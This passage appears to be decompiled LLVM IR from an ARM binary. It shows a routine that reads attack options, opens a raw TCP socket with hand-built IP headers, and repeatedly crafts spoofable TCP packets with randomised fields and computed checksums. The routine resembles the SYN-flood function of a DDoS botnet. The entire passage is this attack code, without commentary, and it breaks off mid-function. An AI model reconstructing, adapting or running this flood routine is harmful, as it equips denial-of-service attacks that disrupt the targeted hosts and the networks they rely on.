  %v0_c42c = load i32, i32* @r4, align 4
  store i32 %v0_c42c, i32* %r1.global-to-local, align 4
  store i32 12, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_c43c = load i32, i32* @r5, align 4
  store i32 %v0_c43c, i32* %r0.global-to-local, align 4
  %v5_c440 = inttoptr i32 %v0_c42c to i32*
  %v6_c440 = call i32 @attack_get_opt_int(i32 %v0_c43c, i32* %v5_c440, i32 12, i32 0)
  %v0_c444 = load i32, i32* @r4, align 4
  store i32 %v0_c444, i32* %r1.global-to-local, align 4
  store i32 13, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_c454 = load i32, i32* @r5, align 4
  store i32 %v0_c454, i32* %r0.global-to-local, align 4
  %v5_c458 = inttoptr i32 %v0_c444 to i32*
  %v6_c458 = call i32 @attack_get_opt_int(i32 %v0_c454, i32* %v5_c458, i32 13, i32 0)
  %v0_c45c = load i32, i32* @r4, align 4
  store i32 %v0_c45c, i32* %r1.global-to-local, align 4
  store i32 14, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_c46c = load i32, i32* @r5, align 4
  store i32 %v0_c46c, i32* %r0.global-to-local, align 4
  %v5_c470 = inttoptr i32 %v0_c45c to i32*
  %v6_c470 = call i32 @attack_get_opt_int(i32 %v0_c46c, i32* %v5_c470, i32 14, i32 1)
  %v0_c474 = load i32, i32* @r4, align 4
  store i32 %v0_c474, i32* %r1.global-to-local, align 4
  store i32 15, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_c484 = load i32, i32* @r5, align 4
  store i32 %v0_c484, i32* %r0.global-to-local, align 4
  %v5_c488 = inttoptr i32 %v0_c474 to i32*
  %v6_c488 = call i32 @attack_get_opt_int(i32 %v0_c484, i32* %v5_c488, i32 15, i32 0)
  %v0_c490 = load i32, i32* @r4, align 4
  store i32 %v0_c490, i32* %r1.global-to-local, align 4
  %v2_c494 = load i32, i32* @global_var_260b8.92, align 4
  store i32 %v2_c494, i32* %r3.global-to-local, align 4
  store i32 24, i32* %r2.global-to-local, align 4
  %v0_c4a0 = load i32, i32* @r5, align 4
  store i32 %v0_c4a0, i32* %r0.global-to-local, align 4
  %v5_c4a4 = inttoptr i32 %v0_c490 to i32*
  %v6_c4a4 = call i32 @attack_get_opt_ip(i32 %v0_c4a0, i32* %v5_c4a4, i32 24, i32 %v2_c494, i32 %v6_c488)
  store i32 0, i32* %r0.global-to-local, align 4
  %v2_c4b0 = call i32 @__GI_time(i32* null)
  %v1_c4b4 = load i32, i32* @r6, align 4
  %v2_c4b4 = add i32 %v1_c4b4, %v2_c4b0
  store i32 3, i32* %r1.global-to-local, align 4
  store i32 2, i32* %r0.global-to-local, align 4
  store i32 6, i32* %r2.global-to-local, align 4
  %v3_c4c8 = call i32 @socket(i32 2, i32 3, i32 6)
  store i32 %v3_c4c8, i32* %r0.global-to-local, align 4
  %v7_c4cc = icmp eq i32 %v3_c4c8, -1
  store i1 %v7_c4cc, i1* %cpsr_z.global-to-local, align 1
  store i32 %v3_c4c8, i32* @r8, align 4
  br i1 %v7_c4cc, label %dec_label_pc_c9a0, label %dec_label_pc_c4d8

dec_label_pc_c4d8:                                ; preds = %entry
  store i32 1, i32* %stack_var_-44, align 4
  %v6_c4e0 = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v6_c4e0, i32* %r3.global-to-local, align 4
  store i32 0, i32* @r1, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v5_c4f4 = call i32 @__GI_setsockopt(i32 %v3_c4c8, i32 0, i32 3, i32 %v6_c4e0, i32 ptrtoint (i32* @0 to i32))
  store i32 %v5_c4f4, i32* %r0.global-to-local, align 4
  %v7_c4f8 = icmp eq i32 %v5_c4f4, -1
  store i1 %v7_c4f8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_c4f8, label %dec_label_pc_c9ac, label %dec_label_pc_c500

dec_label_pc_c500:                                ; preds = %dec_label_pc_c4d8
  %v3_c50c = mul i32 %v8_c34c, 65536
  store i32 %v3_c50c, i32* %r0.global-to-local, align 4
  %v0_c514 = load i32, i32* %fp.global-to-local, align 4
  store i32 0, i32* %stack_var_-44, align 4
  store i32 %v6_c410, i32* %r1.global-to-local, align 4
  %v3_c520 = urem i32 %v8_c34c, 65536
  store i32 %v3_c520, i32* %r2.global-to-local, align 4
  %v3_c524 = urem i32 %v7_c3a8, 65536
  store i32 %v3_c524, i32* %r3.global-to-local, align 4
  %v3_c528 = urem i32 %v0_c514, 65536
  %v0_c52c = load i32, i32* @sb, align 4
  %v2_c52c = icmp eq i32 %v0_c52c, 0
  store i1 %v2_c52c, i1* %cpsr_z.global-to-local, align 1
  %v1_c53c = urem i32 %v6_c410, 256
  store i32 %v1_c53c, i32* @fp, align 4
  br i1 %v2_c52c, label %dec_label_pc_c790.preheader, label %dec_label_pc_c544

dec_label_pc_c544:                                ; preds = %dec_label_pc_c500
  %trunc = trunc i32 %v8_c34c to i16
  %rev = call i16 @llvm.bswap.i16(i16 %trunc)
  %tmp60 = mul nuw nsw i32 %v3_c524, 256
  %v3_c570 = and i32 %tmp60, 65280
  %tmp61 = mul i32 %v0_c514, 256
  %v3_c574 = and i32 %tmp61, 65280
  %tmp62 = mul i32 %v6_c3e0, 256
  %v3_c578 = and i32 %tmp62, 65280
  %v1_c57c = urem i32 %v6_c410, 2
  %tmp63 = udiv i32 %v7_c3a8, 256
  %v4_c580 = urem i32 %tmp63, 256
  %v5_c580 = or i32 %v3_c570, %v4_c580
  %tmp64 = udiv i32 %v0_c514, 256
  %v4_c584 = urem i32 %tmp64, 256
  %v5_c584 = or i32 %v4_c584, %v3_c574
  store i32 %v5_c584, i32* @r5, align 4
  %tmp65 = udiv i32 %v6_c3e0, 256
  %v4_c588 = urem i32 %tmp65, 256
  %v5_c588 = or i32 %v4_c588, %v3_c578
  store i32 %v5_c588, i32* @lr, align 4
  %v1_c59c = urem i32 %v6_c428, 2
  store i32 %v1_c59c, i32* %r1.global-to-local, align 4
  %v1_c5a0 = urem i32 %v6_c440, 2
  store i32 %v1_c5a0, i32* %r2.global-to-local, align 4
  %v1_c5a4 = urem i32 %v6_c458, 2
  store i32 %v1_c5a4, i32* %r3.global-to-local, align 4
  %v1_c5a8 = urem i32 %v6_c470, 2
  store i32 %v1_c5a8, i32* @r6, align 4
  %v1_c5ac = urem i32 %v6_c488, 2
  store i32 %v1_c5ac, i32* %r0.global-to-local, align 4
  store i32 0, i32* @r4, align 4
  %v1_c628 = trunc i32 %v6_c364 to i8
  %sext6 = mul nuw i32 %v5_c580, 65536
  %v4_c654 = sdiv i32 %sext6, 65536
  %sext7 = mul nuw i32 %v5_c584, 65536
  %v6_c690 = sdiv i32 %sext7, 65536
  %tmp = sub nsw i32 0, %v1_c59c
  %v4_c6a8 = and i32 %tmp, 16
  %tmp66 = sub nsw i32 0, %v1_c5a0
  %v4_c6c0 = and i32 %tmp66, 8
  %tmp67 = sub nsw i32 0, %v1_c5a4
  %v4_c6d4 = and i32 %tmp67, 4
  %tmp68 = sub nsw i32 0, %v1_c5a8
  %v3_c6e8 = and i32 %tmp68, 2
  br label %dec_label_pc_c5d4

dec_label_pc_c5d4:                                ; preds = %.thread, %dec_label_pc_c544
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 128, i32* %r0.global-to-local, align 4
  %v2_c5dc = call i32 @calloc(i32 128, i32 1)
  store i32 %v2_c5dc, i32* %r0.global-to-local, align 4
  %v3_c5e0 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_c5e0, i32* %r2.global-to-local, align 4
  %v1_c5e4 = load i32, i32* @sl, align 4
  %v2_c5e4 = load i32, i32* @r4, align 4
  %v5_c5e4 = mul i32 %v2_c5e4, 4
  %v6_c5e4 = add i32 %v5_c5e4, %v1_c5e4
  %v7_c5e4 = inttoptr i32 %v6_c5e4 to i32*
  store i32 %v2_c5dc, i32* %v7_c5e4, align 4
  %v0_c5e8 = load i32, i32* %r2.global-to-local, align 4
  %v3_c5e8 = mul i32 %v0_c5e8, 32
  store i32 %v3_c5e8, i32* %r3.global-to-local, align 4
  %v0_c5ec = load i32, i32* @sl, align 4
  %v4_c5ec = mul i32 %v0_c5e8, 4
  %v5_c5ec = add i32 %v0_c5ec, %v4_c5ec
  %v6_c5ec = inttoptr i32 %v5_c5ec to i32*
  %v7_c5ec = load i32, i32* %v6_c5ec, align 4
  store i32 %v7_c5ec, i32* %r4.global-to-local, align 4
  %v5_c5f0 = mul i32 %v0_c5e8, 24
  store i32 %v5_c5f0, i32* %r3.global-to-local, align 4
  %v1_c5f4 = load i32, i32* @r7, align 4
  %v2_c5f4 = add i32 %v1_c5f4, %v5_c5f0
  store i32 %v2_c5f4, i32* %r0.global-to-local, align 4
  %v1_c5f8 = inttoptr i32 %v7_c5ec to i8*
  %v2_c5f8 = load i8, i8* %v1_c5f8, align 1
  %tmp69 = urem i8 %v2_c5f8, 16
  %v1_c5fc = zext i8 %tmp69 to i32
  %v1_c600 = or i32 %v1_c5fc, 64
  store i32 %v1_c600, i32* %r3.global-to-local, align 4
  %v1_c604 = trunc i32 %v1_c600 to i8
  store i8 %v1_c604, i8* %v1_c5f8, align 1
  %v0_c608 = load i32, i32* %r4.global-to-local, align 4
  %v1_c608 = inttoptr i32 %v0_c608 to i8*
  %v2_c608 = load i8, i8* %v1_c608, align 1
  %v1_c60c = and i8 %v2_c608, -16
  %v1_c610 = or i8 %v1_c60c, 5
  store i32 %v1_c390, i32* %r1.global-to-local, align 4
  store i8 %v1_c610, i8* %v1_c608, align 1
  %v2_c620 = load i32, i32* %r4.global-to-local, align 4
  %v3_c620 = add i32 %v2_c620, 1
  %v4_c620 = inttoptr i32 %v3_c620 to i8*
  store i8 %v5_c348, i8* %v4_c620, align 1
  store i32 %v1_c36c, i32* %r3.global-to-local, align 4
  %v2_c628 = load i32, i32* %r4.global-to-local, align 4
  %v3_c628 = add i32 %v2_c628, 8
  %v4_c628 = inttoptr i32 %v3_c628 to i8*
  store i8 %v1_c628, i8* %v4_c628, align 1
  %v0_c630 = load i32, i32* %r1.global-to-local, align 4
  %v2_c630 = icmp eq i32 %v0_c630, 0
  store i1 %v2_c630, i1* %cpsr_z.global-to-local, align 1
  %v2_c634 = load i32, i32* %r4.global-to-local, align 4
  %v3_c634 = add i32 %v2_c634, 4
  %v4_c634 = inttoptr i32 %v3_c634 to i16*
  store i16 %rev, i16* %v4_c634, align 2
  store i32 6, i32* %r2.global-to-local, align 4
  %v2_c63c = load i32, i32* %r4.global-to-local, align 4
  %v3_c63c = add i32 %v2_c63c, 9
  %v4_c63c = inttoptr i32 %v3_c63c to i8*
  store i8 6, i8* %v4_c63c, align 1
  %v0_c640 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_c640, label %.thread, label %bb

bb:                                               ; preds = %dec_label_pc_c5d4
  store i32 64, i32* %r3.global-to-local, align 4
  %v3_c644 = load i32, i32* %r4.global-to-local, align 4
  %v4_c644 = add i32 %v3_c644, 6
  %v5_c644 = inttoptr i32 %v4_c644 to i16*
  store i16 64, i16* %v5_c644, align 2
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_c5d4, %bb
  store i32 %v6_c4a4, i32* %r3.global-to-local, align 4
  %v1_c64c = load i32, i32* %r4.global-to-local, align 4
  %v2_c64c = add i32 %v1_c64c, 12
  %v3_c64c = inttoptr i32 %v2_c64c to i32*
  store i32 %v6_c4a4, i32* %v3_c64c, align 4
  %v0_c650 = load i32, i32* %r0.global-to-local, align 4
  %v1_c650 = add i32 %v0_c650, 16
  %v2_c650 = inttoptr i32 %v1_c650 to i32*
  %v3_c650 = load i32, i32* %v2_c650, align 4
  store i32 %v3_c650, i32* %r3.global-to-local, align 4
  store i32 %v4_c654, i32* %r0.global-to-local, align 4
  %v2_c65c = load i32, i32* %r4.global-to-local, align 4
  %v3_c65c = add i32 %v2_c65c, 2
  %v4_c65c = inttoptr i32 %v3_c65c to i16*
  store i16 15360, i16* %v4_c65c, align 2
  %v0_c660 = load i32, i32* %r3.global-to-local, align 4
  %v1_c660 = load i32, i32* %r4.global-to-local, align 4
  %v2_c660 = add i32 %v1_c660, 16
  %v3_c660 = inttoptr i32 %v2_c660 to i32*
  store i32 %v0_c660, i32* %v3_c660, align 4
  %v0_c664 = load i32, i32* %r0.global-to-local, align 4
  %v1_c664 = trunc i32 %v0_c664 to i16
  %v2_c664 = load i32, i32* %r4.global-to-local, align 4
  %v3_c664 = add i32 %v2_c664, 20
  %v4_c664 = inttoptr i32 %v3_c664 to i16*
  store i16 %v1_c664, i16* %v4_c664, align 2
  %v0_c668 = load i32, i32* %r4.global-to-local, align 4
  %v1_c668 = add i32 %v0_c668, 20
  store i32 %v1_c668, i32* %r1.global-to-local, align 4
  %v1_c66c = add i32 %v0_c668, 32
  %v2_c66c = inttoptr i32 %v1_c66c to i8*
  %v3_c66c = load i8, i8* %v2_c66c, align 1
  %v4_c66c = zext i8 %v3_c66c to i32
  store i32 %v4_c66c, i32* %r3.global-to-local, align 4
  %v1_c670 = add i32 %v0_c668, 33
  %v2_c670 = inttoptr i32 %v1_c670 to i8*
  %v3_c670 = load i8, i8* %v2_c670, align 1
  %v4_c670 = zext i8 %v3_c670 to i32
  store i32 %v1_c57c, i32* %r0.global-to-local, align 4
  %v1_c678 = urem i8 %v3_c66c, 16
  %v1_c67c = or i8 %v1_c678, -96
  %v1_c680 = and i32 %v4_c670, 223
  store i32 %v1_c680, i32* %r2.global-to-local, align 4
  store i8 %v1_c67c, i8* %v2_c66c, align 1
  %v0_c688 = load i32, i32* %r2.global-to-local, align 4
  %v1_c688 = load i32, i32* %r0.global-to-local, align 4
  %v4_c688 = mul i32 %v1_c688, 32
  %v5_c688 = or i32 %v4_c688, %v0_c688
  store i32 %v5_c688, i32* %r2.global-to-local, align 4
  store i32 %v5_c588, i32* %r0.global-to-local, align 4
  store i32 %v6_c690, i32* %r3.global-to-local, align 4
  %v1_c694 = trunc i32 %v5_c688 to i8
  %v2_c694 = load i32, i32* %r1.global-to-local, align 4
  %v3_c694 = add i32 %v2_c694, 13
  %v4_c694 = inttoptr i32 %v3_c694 to i8*
  store i8 %v1_c694, i8* %v4_c694, align 1
  %v0_c698 = load i32, i32* %r3.global-to-local, align 4
  %v1_c698 = trunc i32 %v0_c698 to i16
  %v2_c698 = load i32, i32* %r1.global-to-local, align 4
  %v3_c698 = add i32 %v2_c698, 2
  %v4_c698 = inttoptr i32 %v3_c698 to i16*
  store i16 %v1_c698, i16* %v4_c698, align 2
  %v0_c69c = load i32, i32* %r1.global-to-local, align 4
  %v1_c69c = add i32 %v0_c69c, 13
  %v2_c69c = inttoptr i32 %v1_c69c to i8*
  %v3_c69c = load i8, i8* %v2_c69c, align 1
  %v4_c69c = zext i8 %v3_c69c to i32
  store i32 %v1_c59c, i32* %r2.global-to-local, align 4
  %v1_c6a4 = and i32 %v4_c69c, 239
  %v5_c6a8 = or i32 %v1_c6a4, %v4_c6a8
  store i32 %v5_c6a8, i32* %r3.global-to-local, align 4
  %v0_c6ac = load i32, i32* %r0.global-to-local, align 4
  %v2_c6ac = add i32 %v0_c69c, 4
  %v3_c6ac = inttoptr i32 %v2_c6ac to i32*
  store i32 %v0_c6ac, i32* %v3_c6ac, align 4
  %v0_c6b0 = load i32, i32* %r3.global-to-local, align 4
  %v1_c6b0 = trunc i32 %v0_c6b0 to i8
  %v2_c6b0 = load i32, i32* %r1.global-to-local, align 4
  %v3_c6b0 = add i32 %v2_c6b0, 13
  %v4_c6b0 = inttoptr i32 %v3_c6b0 to i8*
  store i8 %v1_c6b0, i8* %v4_c6b0, align 1
  %v0_c6b4 = load i32, i32* %r1.global-to-local, align 4
  %v1_c6b4 = add i32 %v0_c6b4, 13
  %v2_c6b4 = inttoptr i32 %v1_c6b4 to i8*
  %v3_c6b4 = load i8, i8* %v2_c6b4, align 1
  %v4_c6b4 = zext i8 %v3_c6b4 to i32
  store i32 %v1_c5a0, i32* %r3.global-to-local, align 4
  %v1_c6bc = and i32 %v4_c6b4, 247
  %v5_c6c0 = or i32 %v1_c6bc, %v4_c6c0
  store i32 %v5_c6c0, i32* %r2.global-to-local, align 4
  %v1_c6c4 = trunc i32 %v5_c6c0 to i8
  store i8 %v1_c6c4, i8* %v2_c6b4, align 1
  %v0_c6c8 = load i32, i32* %r1.global-to-local, align 4
  %v1_c6c8 = add i32 %v0_c6c8, 13
  %v2_c6c8 = inttoptr i32 %v1_c6c8 to i8*
  %v3_c6c8 = load i8, i8* %v2_c6c8, align 1
  %v4_c6c8 = zext i8 %v3_c6c8 to i32
  store i32 %v1_c5a4, i32* %r0.global-to-local, align 4
  %v1_c6d0 = and i32 %v4_c6c8, 251
  %v5_c6d4 = or i32 %v1_c6d0, %v4_c6d4
  store i32 %v5_c6d4, i32* %r3.global-to-local, align 4
  %v1_c6d8 = trunc i32 %v5_c6d4 to i8
  store i8 %v1_c6d8, i8* %v2_c6c8, align 1
  %v0_c6dc = load i32, i32* %r1.global-to-local, align 4
  %v1_c6dc = add i32 %v0_c6dc, 13
  %v2_c6dc = inttoptr i32 %v1_c6dc to i8*
  %v3_c6dc = load i8, i8* %v2_c6dc, align 1
  %v4_c6dc = zext i8 %v3_c6dc to i32
  store i32 %v1_c5a8, i32* %r3.global-to-local, align 4
  %v1_c6e4 = and i32 %v4_c6dc, 253
  %v4_c6e8 = or i32 %v1_c6e4, %v3_c6e8
  store i32 %v4_c6e8, i32* %r2.global-to-local, align 4
  %v1_c6ec = trunc i32 %v4_c6e8 to i8
  store i8 %v1_c6ec, i8* %v2_c6dc, align 1
  %v0_c6f0 = load i32, i32* %r1.global-to-local, align 4
  %v1_c6f0 = add i32 %v0_c6f0, 13
  %v2_c6f0 = inttoptr i32 %v1_c6f0 to i8*
  %v3_c6f0 = load i8, i8* %v2_c6f0, align 1
  %v4_c6f0 = zext i8 %v3_c6f0 to i32
  store i32 %v1_c5ac, i32* %r0.global-to-local, align 4
  %v1_c6f8 = and i32 %v4_c6f0, 254
  %v2_c6fc = or i32 %v1_c6f8, %v1_c5ac
  store i32 %v2_c6fc, i32* %r3.global-to-local, align 4
  store i32 2, i32* @r5, align 4
  store i32 4, i32* @r6, align 4
  %v1_c708 = trunc i32 %v2_c6fc to i8
  store i8 %v1_c708, i8* %v2_c6f0, align 1
  %v0_c70c = load i32, i32* @r5, align 4
  %v1_c70c = trunc i32 %v0_c70c to i8
  %v2_c70c = load i32, i32* %r4.global-to-local, align 4
  %v3_c70c = add i32 %v2_c70c, 40
  %v4_c70c = inttoptr i32 %v3_c70c to i8*
  store i8 %v1_c70c, i8* %v4_c70c, align 1
  %v0_c710 = load i32, i32* @r6, align 4
  %v1_c710 = trunc i32 %v0_c710 to i8
  %v2_c710 = load i32, i32* %r4.global-to-local, align 4
  %v3_c710 = add i32 %v2_c710, 41
  %v4_c710 = inttoptr i32 %v3_c710 to i8*
  store i8 %v1_c710, i8* %v4_c710, align 1
  %v0_c714 = call i32 @rand_next()
  %v1_c718 = urem i32 %v0_c714, 16
  %v1_c71c = or i32 %v1_c718, 1392
  %v1_c720 = add nuw nsw i32 %v1_c71c, 8
  %v3_c724 = mul nuw nsw i32 %v1_c720, 65536
  store i32 %v3_c724, i32* %r0.global-to-local, align 4
  %v3_c728 = mul nuw nsw i32 %v1_c720, 256
  %v5_c730 = or i32 %v3_c728, 5
  %v1_c734 = trunc i32 %v5_c730 to i16
  %v2_c734 = load i32, i32* %r4.global-to-local, align 4
  %v3_c734 = add i32 %v2_c734, 42
  %v4_c734 = inttoptr i32 %v3_c734 to i16*
  store i16 %v1_c734, i16* %v4_c734, align 2
  store i32 10, i32* %r2.global-to-local, align 4
  store i32 8, i32* %r3.global-to-local, align 4
  %v2_c740 = load i32, i32* %r4.global-to-local, align 4
  %v3_c740 = add i32 %v2_c740, 46
  %v4_c740 = inttoptr i32 %v3_c740 to i8*
  store i8 8, i8* %v4_c740, align 1
  %v0_c744 = load i32, i32* %r2.global-to-local, align 4
  %v1_c744 = trunc i32 %v0_c744 to i8
  %v2_c744 = load i32, i32* %r4.global-to-local, align 4
  %v3_c744 = add i32 %v2_c744, 47
  %v4_c744 = inttoptr i32 %v3_c744 to i8*
  store i8 %v1_c744, i8* %v4_c744, align 1
  %v0_c748 = load i32, i32* @r6, align 4
  %v1_c748 = trunc i32 %v0_c748 to i8
  %v2_c748 = load i32, i32* %r4.global-to-local, align 4
  %v3_c748 = add i32 %v2_c748, 44
  %v4_c748 = inttoptr i32 %v3_c748 to i8*
  store i8 %v1_c748, i8* %v4_c748, align 1
  %v0_c74c = load i32, i32* @r5, align 4
  %v1_c74c = trunc i32 %v0_c74c to i8
  %v2_c74c = load i32, i32* %r4.global-to-local, align 4
  %v3_c74c = add i32 %v2_c74c, 45
  %v4_c74c = inttoptr i32 %v3_c74c to i8*
  store i8 %v1_c74c, i8* %v4_c74c, align 1
  %v0_c750 = call i32 @rand_next()
  store i32 %v0_c750, i32* %r0.global-to-local, align 4
  %v2_c758 = load i32, i32* %r4.global-to-local, align 4
  %v3_c758 = add i32 %v2_c758, 59
  %v4_c758 = inttoptr i32 %v3_c758 to i8*
  store i8 6, i8* %v4_c758, align 1
  store i32 3, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  %v1_c768 = load i32, i32* %r4.global-to-local, align 4
  %v2_c768 = add i32 %v1_c768, 48
  %v3_c768 = inttoptr i32 %v2_c768 to i32*
  store i32 %v0_c750, i32* %v3_c768, align 4
  %v0_c76c = load i32, i32* %r3.global-to-local, align 4
  %v1_c76c = load i32, i32* %r4.global-to-local, align 4
  %v2_c76c = add i32 %v1_c76c, 52
  %v3_c76c = inttoptr i32 %v2_c76c to i32*
  store i32 %v0_c76c, i32* %v3_c76c, align 4
  %v0_c770 = load i32, i32* %r2.global-to-local, align 4
  %v1_c770 = trunc i32 %v0_c770 to i8
  %v2_c770 = load i32, i32* %r4.global-to-local, align 4
  %v3_c770 = add i32 %v2_c770, 56
  %v4_c770 = inttoptr i32 %v3_c770 to i8*
  store i8 %v1_c770, i8* %v4_c770, align 1
  %v0_c774 = load i32, i32* %r1.global-to-local, align 4
  %v1_c774 = trunc i32 %v0_c774 to i8
  %v2_c774 = load i32, i32* %r4.global-to-local, align 4
  %v3_c774 = add i32 %v2_c774, 58
  %v4_c774 = inttoptr i32 %v3_c774 to i8*
  store i8 %v1_c774, i8* %v4_c774, align 1
  %v0_c778 = load i32, i32* %r1.global-to-local, align 4
  %v1_c778 = trunc i32 %v0_c778 to i8
  %v2_c778 = load i32, i32* %r4.global-to-local, align 4
  %v3_c778 = add i32 %v2_c778, 57
  %v4_c778 = inttoptr i32 %v3_c778 to i8*
  store i8 %v1_c778, i8* %v4_c778, align 1
  %v3_c77c = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_c77c, i32* %r3.global-to-local, align 4
  %v1_c780 = load i32, i32* %r2.global-to-local, align 4
  %v2_c780 = add i32 %v1_c780, %v3_c77c
  store i32 %v2_c780, i32* @r4, align 4
  %v1_c784 = load i32, i32* @sb, align 4
  %v9_c784 = icmp eq i32 %v2_c780, %v1_c784
  store i1 %v9_c784, i1* %cpsr_z.global-to-local, align 1
  store i32 %v2_c780, i32* %stack_var_-44, align 4
  %v5_c78c = icmp slt i32 %v2_c780, %v1_c784
  br i1 %v5_c78c, label %dec_label_pc_c5d4, label %dec_label_pc_c790.preheader

dec_label_pc_c790.preheader:                      ; preds = %.thread, %dec_label_pc_c500
  %v0_c79410 = phi i32 [ 0, %dec_label_pc_c500 ], [ %v1_c784, %.thread ]
  %v2_c7ac = icmp eq i32 %v6_c4a4, -1
  %v7_c7ac = icmp eq i32 %v6_c4a4, -1
  %v9_c918 = icmp eq i32 %v3_c520, ptrtoint ([3 x i8]* @global_var_ffff.36 to i32)
  %v9_c7cc = icmp eq i32 %v3_c524, ptrtoint ([3 x i8]* @global_var_ffff.36 to i32)
  br label %dec_label_pc_c790

dec_label_pc_c790:                                ; preds = %dec_label_pc_c98c.dec_label_pc_c790_crit_edge, %dec_label_pc_c790.preheader
  %v0_c794 = phi i32 [ %v0_c794.pre, %dec_label_pc_c98c.dec_label_pc_c790_crit_edge ], [ %v0_c79410, %dec_label_pc_c790.preheader ]
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_c794 = icmp eq i32 %v0_c794, 0
  store i1 %v2_c794, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %stack_var_-44, align 4
  br i1 %v2_c794, label %dec_label_pc_c98c, label %dec_label_pc_c7a0

dec_label_pc_c7a0:                                ; preds = %dec_label_pc_c790
  store i32 0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_c884

dec_label_pc_c7a8:                                ; preds = %dec_label_pc_c884
  store i32 %v6_c4a4, i32* %r3.global-to-local, align 4
  store i1 %v7_c7ac, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_c7ac, label %dec_label_pc_c904, label %dec_label_pc_c7b4

dec_label_pc_c7b4:                                ; preds = %dec_label_pc_c8a4, %dec_label_pc_c7a8
  store i32 %v3_c520, i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_ffff.36 to i32), i32* @r4, align 4
  store i1 %v9_c918, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_c918, label %dec_label_pc_c920, label %dec_label_pc_c7c8

dec_label_pc_c7c8:                                ; preds = %dec_label_pc_c904, %dec_label_pc_c7b4
  store i32 %v3_c524, i32* %r1.global-to-local, align 4
  store i1 %v9_c7cc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_c7cc, label %dec_label_pc_c934, label %dec_label_pc_c7d4

dec_label_pc_c7d4:                                ; preds = %dec_label_pc_c920.dec_label_pc_c7d4_crit_edge, %dec_label_pc_c7c8
  %v1_c7d8 = phi i32 [ %v1_c7d8.pre, %dec_label_pc_c920.dec_label_pc_c7d4_crit_edge ], [ ptrtoint ([3 x i8]* @global_var_ffff.36 to i32), %dec_label_pc_c7c8 ]
  store i32 %v3_c528, i32* %r2.global-to-local, align 4
  %v9_c7d8 = icmp eq i32 %v3_c528, %v1_c7d8
  store i1 %v9_c7d8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_c7d8, label %dec_label_pc_c948, label %dec_label_pc_c7e0

dec_label_pc_c7e0:                                ; preds = %dec_label_pc_c934.dec_label_pc_c7e0_crit_edge, %dec_label_pc_c7d4
  %v1_c7e4 = phi i32 [ %v1_c7e4.pre, %dec_label_pc_c934.dec_label_pc_c7e0_crit_edge ], [ %v1_c7d8, %dec_label_pc_c7d4 ]
  store i32 %v6_c3e0, i32* %r3.global-to-local, align 4
  %v9_c7e4 = icmp eq i32 %v6_c3e0, %v1_c7e4
  store i1 %v9_c7e4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_c7e4, label %dec_label_pc_c95c, label %dec_label_pc_c7ec

dec_label_pc_c7ec:                                ; preds = %dec_label_pc_c948.dec_label_pc_c7ec_crit_edge, %dec_label_pc_c7e0
  %v1_c7f0 = phi i32 [ %v1_c7f0.pre, %dec_label_pc_c948.dec_label_pc_c7ec_crit_edge ], [ %v1_c7e4, %dec_label_pc_c7e0 ]
  store i32 %v6_c3f8, i32* %r0.global-to-local, align 4
  %v9_c7f0 = icmp eq i32 %v6_c3f8, %v1_c7f0
  store i1 %v9_c7f0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_c7f0, label %dec_label_pc_c970, label %dec_label_pc_c7f8

dec_label_pc_c7f8:                                ; preds = %dec_label_pc_c95c, %dec_label_pc_c7ec
  %v0_c7f8 = load i32, i32* @fp, align 4
  %v2_c7f8 = icmp eq i32 %v0_c7f8, 0
  store i1 %v2_c7f8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_c7f8, label %dec_label_pc_c800, label %dec_label_pc_c980

dec_label_pc_c800:                                ; preds = %dec_label_pc_c7f8, %dec_label_pc_c970, %dec_label_pc_c980
  %v2_c804 = load i32, i32* @r5, align 4
  %v3_c804 = add i32 %v2_c804, 10
  %v4_c804 = inttoptr i32 %v3_c804 to i16*
  store i16 0, i16* %v4_c804, align 2
  %v0_c808 = load i32, i32* @r5, align 4
  store i32 %v0_c808, i32* @r0, align 4
  store i32 20, i32* %r1.global-to-local, align 4
  %v2_c810 = call i32 @checksum_generic(i32 %v0_c808, i32 20)
  %v3_c810 = trunc i32 %v2_c810 to i16
  store i32 0, i32* %r2.global-to-local, align 4
  %v3_c818 = load i32, i32* @r5, align 4
  %v4_c818 = add i32 %v3_c818, 10
  %v5_c818 = inttoptr i32 %v4_c818 to i16*
  store i16 %v3_c810, i16* %v5_c818, align 2
  %v0_c81c = load i32, i32* @r6, align 4
  store i32 %v0_c81c, i32* @r1, align 4
  %v0_c820 = load i32, i32* %r2.global-to-local, align 4
  %v1_c820 = trunc i32 %v0_c820 to i16
  %v3_c820 = add i32 %v0_c81c, 16
  %v4_c820 = inttoptr i32 %v3_c820 to i16*
  store i16 %v1_c820, i16* %v4_c820, align 2
  store i32 40, i32* %r3.global-to-local, align 4
  store i32 10240, i32* %r2.global-to-local, align 4
  %v0_c82c = load i32, i32* @r5, align 4
  store i32 %v0_c82c, i32* %r0.global-to-local, align 4
  %v4_c830 = call i32 @checksum_tcpudp(i32 %v0_c82c, i32 %v0_c81c, i32 10240, i32 40)
  %v5_c830 = trunc i32 %v4_c830 to i16
  store i32 %v4_c830, i32* %r0.global-to-local, align 4
  %v3_c834 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_c834, i32* %r3.global-to-local, align 4
